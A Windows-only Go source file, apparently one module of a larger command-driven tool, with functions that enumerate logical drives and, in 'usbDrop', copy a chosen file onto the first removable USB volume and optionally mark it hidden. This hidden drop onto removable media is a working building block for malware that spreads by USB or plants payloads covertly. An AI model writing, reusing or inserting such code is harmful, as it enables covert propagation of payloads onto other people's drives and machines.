//go:build windows
// +build windows

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
)

var (
	procGetLogicalDrives     = k32.NewProc("GetLogicalDrives")
	procGetDriveTypeW        = k32.NewProc("GetDriveTypeW")
	procGetDiskFreeSpaceExW  = k32.NewProc("GetDiskFreeSpaceExW")
	procGetVolumeInformationW = k32.NewProc("GetVolumeInformationW")
)

const (
	driveUnknown     = 0
	driveNoRoot      = 1
	driveRemovable   = 2
	driveFixed       = 3
	driveRemote      = 4
	driveCDROM       = 5
	driveRAMDisk     = 6
	fileAttrHidden   = 0x2
	fileAttrSystem   = 0x4
)

func driveTypeName(t uint32) string {
	switch t {
	case driveRemovable:
		return "removable"
	case driveFixed:
		return "fixed"
	case driveRemote:
		return "remote"
	case driveCDROM:
		return "cdrom"
	case driveRAMDisk:
		return "ram"
	case driveNoRoot:
		return "no_root"
	default:
		return "unknown"
	}
}

type winVolume struct {
	root   string
	kind   uint32
	label  string
	free   uint64
	total  uint64
}

func listWinVolumes() []winVolume {
	mask, _, _ := procGetLogicalDrives.Call()
	var out []winVolume
	for i := 0; i < 26; i++ {
		if mask&(1<<uint(i)) == 0 {
			continue
		}
		root := string(rune('A'+i)) + `:\`
		rootPtr, err := syscall.UTF16PtrFromString(root)
		if err != nil {
			continue
		}
		dt, _, _ := procGetDriveTypeW.Call(uintptr(unsafe.Pointer(rootPtr)))
		v := winVolume{root: root, kind: uint32(dt)}
		var free, total, totalFree uint64
		procGetDiskFreeSpaceExW.Call(
			uintptr(unsafe.Pointer(rootPtr)),
			uintptr(unsafe.Pointer(&free)),
			uintptr(unsafe.Pointer(&total)),
			uintptr(unsafe.Pointer(&totalFree)),
		)
		v.free, v.total = free, total
		labelBuf := make([]uint16, 64)
		procGetVolumeInformationW.Call(
			uintptr(unsafe.Pointer(rootPtr)),
			uintptr(unsafe.Pointer(&labelBuf[0])),
			uintptr(len(labelBuf)),
			0, 0, 0, 0, 0,
		)
		v.label = syscall.UTF16ToString(labelBuf)
		out = append(out, v)
	}
	return out
}

func usbEnum() (string, error) {
	vols := listWinVolumes()
	if len(vols) == 0 {
		return "usb_enum: no logical drives returned", nil
	}
	var sb strings.Builder
	sb.WriteString("=== volume enum (Windows GetDriveType) ===\n")
	sb.WriteString("root\ttype\tlabel\tfree\ttotal\n")
	for _, v := range vols {
		fmt.Fprintf(&sb, "\t%s\t%s\t%s\t%d\t%d\n", v.root, driveTypeName(v.kind), v.label, v.free, v.total)
	}
	return sb.String(), nil
}

func firstRemovableRoot() (string, error) {
	for _, v := range listWinVolumes() {
		if v.kind == driveRemovable {
			return v.root, nil
		}
	}
	return "", fmt.Errorf("usb_drop: no removable volume mounted")
}

func isRemovableRoot(path string) bool {
	vol := winVolumeRoot(path)
	for _, v := range listWinVolumes() {
		if strings.EqualFold(v.root, vol) {
			return v.kind == driveRemovable
		}
	}
	return false
}

func winVolumeRoot(path string) string {
	abs, err := filepath.Abs(path)
	if err != nil {
		abs = path
	}
	abs = filepath.Clean(abs)
	if len(abs) >= 2 && abs[1] == ':' {
		return strings.ToUpper(abs[:1]) + `:\`
	}
	return abs
}

func usbDrop(src, destRoot string, hide bool) (string, error) {
	if _, err := os.Stat(src); err != nil {
		return "", fmt.Errorf("usb_drop: source: %w", err)
	}
	if strings.TrimSpace(destRoot) == "" {
		root, err := firstRemovableRoot()
		if err != nil {
			return "", err
		}
		destRoot = root
	}
	destRoot = strings.TrimSpace(destRoot)
	if !isRemovableRoot(destRoot) {
		return "", fmt.Errorf("usb_drop: destination %s is not a removable volume", destRoot)
	}
	dst := usbDropDestName(src, destRoot)
	n, err := copyRegularFile(src, dst)
	if err != nil {
		return "", fmt.Errorf("usb_drop copy: %w", err)
	}
	if hide {
		ptr, err := syscall.UTF16PtrFromString(dst)
		if err == nil {
			procSetFileAttributesW.Call(uintptr(unsafe.Pointer(ptr)), uintptr(fileAttrHidden))
		}
	}
	return fmt.Sprintf("usb_drop: copied %d bytes to %s hide=%v", n, dst, hide), nil
}
